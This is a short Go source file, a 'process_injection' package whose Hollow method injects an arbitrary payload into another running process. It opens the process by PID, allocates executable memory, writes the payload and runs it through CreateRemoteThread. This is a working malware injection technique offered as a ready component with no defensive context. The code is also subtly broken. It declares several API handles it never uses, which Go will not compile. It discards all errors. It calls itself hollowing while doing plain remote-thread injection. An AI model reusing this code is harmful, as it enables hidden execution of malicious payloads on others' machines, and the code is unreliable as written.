package process_injection

import (
"syscall"
"unsafe"
)

type ProcessHollowing struct{}

func NewProcessHollowing() *ProcessHollowing {
return &ProcessHollowing{}
}

func (p *ProcessHollowing) Hollow(pid int, payload []byte) error {
kernel32 := syscall.NewLazyDLL("kernel32.dll")
procOpenProcess := kernel32.NewProc("OpenProcess")
procVirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
procWriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
procSetThreadContext := kernel32.NewProc("SetThreadContext")
procResumeThread := kernel32.NewProc("ResumeThread")
procGetThreadContext := kernel32.NewProc("GetThreadContext")
procCreateRemoteThread := kernel32.NewProc("CreateRemoteThread")
procGetCurrentProcess := kernel32.NewProc("GetCurrentProcess")

handle, _, _ := procOpenProcess.Call(0x1F0FFF, 0, uintptr(pid))

// Allocate and write payload
addr, _, _ := procVirtualAllocEx.Call(handle, 0, uintptr(len(payload)), 0x3000, 0x40)
var written uintptr
procWriteProcessMemory.Call(handle, addr, uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)), uintptr(unsafe.Pointer(&written)))

// Create remote thread to execute payload
procCreateRemoteThread.Call(handle, 0, 0, addr, 0, 0, 0)

return nil
}
